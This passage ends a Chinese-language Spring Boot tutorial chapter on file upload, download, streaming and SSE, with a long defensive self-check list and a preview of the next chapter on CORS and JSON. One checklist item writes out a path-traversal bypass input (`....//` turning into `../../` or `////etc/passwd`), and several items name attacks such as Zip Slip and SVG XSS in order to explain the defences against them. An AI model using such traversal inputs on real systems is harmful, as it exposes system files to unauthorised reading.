| **指標 + 告警** | `shop_sse_connections` 的 `deriv() > 0 for 30m`（5.11.8）。**這是最重要的一條** —— 它讓下一次洩漏在 30 分鐘內被發現，而不是 3 天 |
| **`stale` 指標** | 步驟 2 的那個 gauge。它比總數更早、更明確 |
| **`@AfterEach` 的洩漏檢查** | 5.13.4 —— 讓「新的 SSE 端點忘記清理」在 CI 就被抓到 |
| **硬斷線測試** | 上面那個 `SO_LINGER` 的測試放進整合測試套件 |
| **連線數上限** | 5.11.6 —— 洩漏時服務會回 503（可見的失敗）而不是把 Tomcat 的 connection slot 吃光（讓**所有**端點掛掉） |
| **只有一個地方負責清理** | 5.11.4 的註解：`onCompletion` 是唯一的清理點，心跳失敗只呼叫 `completeWithError`（讓它觸發 `onCompletion`）。**兩個地方都清理 = 兩個地方都可能有 bug** |

⚠️ **最後一條值得強調**：這類 bug 的根因常常是
「有三個地方都試圖清理，但每個都有不同的條件判斷」。
**把清理集中在一個入口，並讓其他路徑都導向它**，是唯一可靠的設計。

</details>

---

## 5.16 驗收清單

- [ ] 我知道 multipart 的暫存檔在哪裡、誰負責刪，以及**五種不會被刪的情況**。
- [ ] 我知道 `MultipartFile` 的生命週期 = 請求的生命週期，**不可以進 `@Async`**。
- [ ] 我能說出 `max-file-size` / `max-request-size` / `file-size-threshold` / `location` 各管什麼。
- [ ] **我知道 `file-size-threshold` 是一個隱藏的記憶體乘數**（值 × 併發數）。
- [ ] 我知道 `maxSwallowSize`（2 MB）會讓大檔的 413 變成 connection reset。
- [ ] 我能說出四層大小上限（Nginx / Filter / Tomcat request / Tomcat file）各自擋誰。
- [ ] 我知道 `@RequestPart` 與 `@RequestParam` 的差別（前者用 `HttpMessageConverter`）。
- [ ] 我知道 multipart 的 JSON part 必須帶 `Content-Type: application/json`。
- [ ] **我知道 `getOriginalFilename()` 是完全不可信的輸入，並能說出四種攻擊。**
- [ ] 我知道防路徑穿越的正確做法是「只取最後一段」而不是「移除 `..`」。
- [ ] 我知道 `....//` 可以繞過單次字串替換（`replace("../","")` 會還原成 `../../`；`replace("..","")` 會變成絕對路徑 `////etc/passwd`，而 `resolve()` 遇到絕對路徑會丟棄 baseDir）。
- [ ] 我知道檔名的長度要同時限制**字元數與位元組數**（中文檔名）。
- [ ] 我知道 `U+202E` 可以讓 `.exe` 顯示成 `.jpg`。
- [ ] **我知道儲存 key 一定要自己產生，而且那還帶來 CDN 永久快取的好處。**
- [ ] 我知道副檔名與 `Content-Type` 都由客戶端提供，都不可信。
- [ ] 我能列出 JPEG / PNG / GIF / WebP / PDF / ZIP 的 magic number。
- [ ] **我知道 RIFF 前綴不足以判定 WebP（WAV / AVI 也是 RIFF）。**
- [ ] 我知道 magic number 只是必要條件（polyglot 檔案）。
- [ ] **我知道二次編碼是最強的防護，也知道它同時移除了 EXIF 的 GPS 座標。**
- [ ] 我知道「先讀 header 拿尺寸，再解碼」的順序不能反 —— 41 KB 的 PNG 可以是 1.6 GB。
- [ ] 我知道 `BufferedImage` 的大小是 `width × height × 4`，與檔案大小無關。
- [ ] 我知道圖片解碼需要一個併發閘門（semaphore），否則併發數 × 200 MB。
- [ ] 我知道 ZIP bomb 的四道防線，也知道**絕不能相信 `ZipEntry.getSize()`**。
- [ ] 我知道 Zip Slip，也知道它的防法和檔名一樣。
- [ ] **我知道 SVG 可以在你的網域上執行 script，以及「必須接受它」時的三個要求。**
- [ ] 我知道使用者上傳的內容要回 `X-Content-Type-Options: nosniff` + CSP sandbox。
- [ ] 我知道掃毒的 `UNAVAILABLE` 必須是一個明確的狀態（fail-open / closed / 延後）。
- [ ] 我知道 EICAR 字串在原始碼裡要拆開寫（否則 CI 的防毒會隔離整個專案）。
- [ ] **我知道驗證的順序（大小 → magic → 尺寸 → 白名單 → 重編碼／掃毒）不能改。**
- [ ] 我知道 multipart 的冪等指紋不能含 body（boundary 每次不同）。
- [ ] **我知道 `CachedBodyFilter` 必須跳過 multipart，否則 `MultipartFile` 會綁到 null。**
- [ ] 我能說出「> 10 MB 用預簽名 URL」的四個具體理由（執行緒、頻寬、記憶體、續傳）。
- [ ] 我知道預簽名上傳的 complete 步驟要做**六道驗證**，尤其是「物件真的存在」。
- [ ] 我知道 S3 的 `AbortIncompleteMultipartUpload` 沒設會一直計費且看不到。
- [ ] **我知道 Spring 的 `ContentDisposition` 只給 `filename*`，要自己加 ASCII 後備。**
- [ ] 我知道 `filename` 的 ASCII 後備必須移除控制字元（header 注入）。
- [ ] 我知道 RFC 5987 的百分比編碼不能用 `URLEncoder`（空白會變 `+`）。
- [ ] 我知道 `inline` + HTML/SVG = XSS，使用者內容一律 `attachment`。
- [ ] 我知道 `ResponseEntity<Resource>` 自動支援 Range，也知道它的三個前提。
- [ ] **我知道 `InputStreamResource` 的 `contentLength()` 會吃掉整個流。**
- [ ] 我能說出「代理 vs 302 預簽名」的取捨，並為五種資源各選一個。
- [ ] 我知道下載的 IDOR 有四層防護，而且巢狀資源要驗證父子關係。
- [ ] 我能說出四種匯出寫法的記憶體峰值（1.15 GB / 780 MB / 3 MB / 0）。
- [ ] **我知道 `StreamingResponseBody` 跑在 async executor 上，而預設是 `SimpleAsyncTaskExecutor`。**
- [ ] 我能列出六個「在串流執行緒上不可用」的東西。
- [ ] 我知道 `@Transactional` 包不住串流，要讓查詢每批自己開交易。
- [ ] **我知道串流失敗只能拿到「200 + 部分資料」，也知道三層應對。**
- [ ] 我知道 `JsonGenerator.close()` 會自動補齊未閉合的結構（破壞完整性保證）。
- [ ] 我知道 NDJSON 是「完整性最容易表達」的串流格式。
- [ ] 我知道 CSV 公式注入，也知道 xlsx 在結構上沒有這個問題。
- [ ] 我知道 `SXSSFWorkbook` 一定要 `dispose()`，而且 `CellStyle` 不能在迴圈裡建。
- [ ] 我知道 xlsx 的列上限是 1,048,576。
- [ ] **我知道 `StreamingRequests` 為什麼要集中判斷，也知道那個 WARN 的價值。**
- [ ] 我知道「工作失敗」回 200 而不是 500。
- [ ] 我知道 `Retry-After` 要動態計算，否則客戶端會輪詢 900 次。
- [ ] 我知道進度更新要節流（每 2000 筆），而且要用 `REQUIRES_NEW`。
- [ ] 我知道要用 `lastHeartbeatAt` 而不是 `startedAt` 判斷「卡住」。
- [ ] 我知道清理的順序是「先改狀態，再刪物件」。
- [ ] **我知道一次性 token 要存 hash、要原子消耗、要寫稽核。**
- [ ] 我知道 query string 裡的敏感值也要遮蔽（不只 body）。
- [ ] 我知道 SSE 的五種行前綴，以及「空行是事件分隔符」。
- [ ] 我知道 HTTP/1.1 的「同網域 6 條連線」限制，以及 HTTP/2 是正解。
- [ ] **我知道 `onCompletion` 是唯一「一定會被呼叫」的回呼，清理只寫那裡。**
- [ ] **我知道沒送 `stream.end` 就 `complete()` 會造成每 3 秒一次的無限重連。**
- [ ] 我知道心跳用註解行（`:`），而且它同時是偵測死連線的唯一手段。
- [ ] 我知道 `@Scheduled` 的預設 scheduler 只有一條執行緒，而且拋例外會讓任務停止排程。
- [ ] 我知道 `Last-Event-ID` 來自客戶端，格式必須驗證，而且 F5 時不會有。
- [ ] 我知道「快照 + 增量」是所有即時推播的正確架構。
- [ ] 我知道 SSE 的 registry 要有總數與每 actor 的上限。
- [ ] **我知道多實例部署下 SSE 一定要 pub/sub，也知道 sticky session 為什麼不好。**
- [ ] **我能說出 SSE 在 Nginx 後面的三個問題（buffering、timeout、gzip）與解法。**
- [ ] 我知道 `X-Accel-Buffering: no` 是應用層唯一能自救的手段。
- [ ] 我知道 SSE 會佔 Tomcat 的 connection slot（不是 worker thread）。
- [ ] 我知道 `EventSource` 的 `onerror` 拿不到狀態碼與 body，所以要先打一次一般 GET。
- [ ] 我知道 `addEventListener('error')` 與 `source.onerror` 是兩件不同的事。
- [ ] 我知道測試要用**真的**圖片位元組（`ImageIO.write`），否則只測到 415。
- [ ] 我知道 MockMvc 測串流要用 `asyncDispatch(result)`。
- [ ] 我知道 SSE 測試的 `@AfterEach` 要斷言 `registry.size() == 0`。
- [ ] 我知道用 `SO_LINGER 0` 才能測出「硬斷線」的洩漏。
- [ ] 我知道測試資源目錄要有一個 README 說明「每個惡意樣本是什麼」。
- [ ] **我知道 `DownloadableReceipt` 這種「型別本身就是授權已通過的證明」的模式。**
- [ ] 我知道 command 型別用 `byte[]` 而不是 `MultipartFile`，讓它能安全跨出請求執行緒。
- [ ] 我知道含 `byte[]` 的 record 一定要覆寫 `toString()`。
- [ ] 我知道 `tryConsume` 這個命名讓「必須原子」變成一件明顯的事。
- [ ] 我知道每寫完一個大段落要回頭掃「引用了但沒定義的東西」。

### 關機（5.11.10）

- [ ] **我知道 `server.shutdown` 預設是 `immediate`，而那讓 5.11.6 的 `shutdown()` 完全失效。**
- [ ] 我知道那個失效是**靜默的** —— `catch (Exception ignored)` 把 2,000 次失敗全吞了。
- [ ] **我知道 `@PreDestroy` 在 graceful 等待「之後」，所以會讓部署固定慢 45 秒。**
- [ ] 我知道改用 `ContextClosedEvent` 之後，部署時間從 45 秒降到約 1 秒。
- [ ] 我有一個判準：**這個動作會影響「Tomcat 要等多久」嗎** → 會就用 `ContextClosedEvent`。
- [ ] 我知道 SSE 被硬砍幾乎無感（會自動重連），而**串流下載被硬砍是靜默的資料損毀**。
- [ ] **我知道 chunked 傳輸沒有 `Content-Length`，所以客戶端分不出「傳完了」與「被砍了」。**
- [ ] 我知道 `ShutdownSignal` 的存在理由：graceful 只會「等待」，不會「通知」。
- [ ] 我知道串流要寫 sentinel，也知道它是**緩解**而不是解法（正解是 5.10 的非同步匯出）。
- [ ] **我知道 `max-sync-rows` 與 `timeout-per-shutdown-phase` 是綁在一起的兩個數字。**
- [ ] **我知道 K8s 的 `preStop` 要 `sleep`，因為「移除 endpoint」與「送 SIGTERM」是並行的。**
- [ ] 我能寫出那三個數字的不等式，也把它變成了一個純單元測試。

---

## 5.17 下一章預告

這一章讓 API 能處理「不是 JSON」的東西。
06 章回到 JSON，但要處理**它跨越邊界時的所有問題**：

- **CORS 的完整機制**：同源政策到底擋什麼（**它不擋請求送出，擋的是讀回應**）、
  simple vs preflight 的判準、`allowedOrigins` 與 `allowedOriginPatterns` 的差別、
  **為什麼 `*` 不能和 `credentials: true` 併用**。
- **CORS 與 Spring Security 的關係**：為什麼 `CorsFilter` 必須在
  `springSecurityFilterChain`（-100）**之前**，
  以及 **「錯誤回應也要有 CORS header」** 這個最容易漏掉的細節
  （沒有它，前端看到的所有錯誤都是「Network Error」，
  拿不到 03 章精心設計的 Problem JSON）。
- **內容協商**：`Accept` 的 q 值與 Spring 的選擇演算法、
  `produces` / `consumes` 的實際效果、406 vs 415 的判準、
  **Spring 6 為什麼移除了 `favorPathExtension`**（以及那讓 `/orders.json` 變成 404）。
- **自訂 `HttpMessageConverter`**：讓 `List<OrderSummary>` 可以直接回 CSV，
  以及 ⚠️ **`configureMessageConverters` 會弄掉 `ResourceRegionHttpMessageConverter`**
  （也就是弄掉 5.8.3 的 Range 支援）。
- **`ObjectMapper` 從哪裡來**：`Jackson2ObjectMapperBuilder` 的組裝過程、
  **為什麼永遠不要 `new ObjectMapper()`**、多個 mapper 共存的正確做法。
- **金額的序列化**：`BigDecimal` 在 JSON 裡的三個坑
  （科學記號、`WRITE_BIGDECIMAL_AS_PLAIN`、JavaScript 的 `Number` 精度）。
- **時間與時區**：為什麼一律 UTC + ISO-8601，以及 `@JsonFormat` 什麼時候會害你。
- **enum 的演進**：未知的 enum 值該怎麼處理（**這是 03-rest-api 第 00 章
  那個「新增列舉值炸掉 App」事故的落地修法**）。
- **序列化的安全問題**：polymorphic deserialization、
  Jackson 的 `StreamReadConstraints`（JSON 深度炸彈）、
  `HttpMessageNotWritableException` 為什麼特別難處理。
- **`ResponseBodyAdvice`**：稀疏欄位集（`?fields=`）與統一包裝的落地，
  以及它與 5.9 的串流為什麼衝突。
- **`ETag` 與條件請求**：`ShallowEtagHeaderFilter` 的真實成本，
  以及為什麼 shop-service 選擇自己算 ETag。

---

完成後請前往 [06-cors-content-negotiation-and-json.md](./06-cors-content-negotiation-and-json.md)。
